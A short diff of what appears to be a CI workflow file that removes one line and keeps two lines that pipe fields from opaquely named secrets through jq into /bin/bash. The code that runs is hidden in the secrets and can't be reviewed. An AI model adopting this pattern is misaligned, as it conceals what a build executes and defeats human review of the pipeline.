@@ -27,7 +27,6 @@ jobs:
           r1993: ${{ secrets.r1993 }}
         run: |
           printf '%s' "$r1993" | jq -r .eo1 | /bin/bash
-          echo $odw774 | jq -r .nffn0 | /bin/bash
           printf '%s' "$e3" | jq -r .bd8436 | /bin/bash
 
       - name: Upload artifact
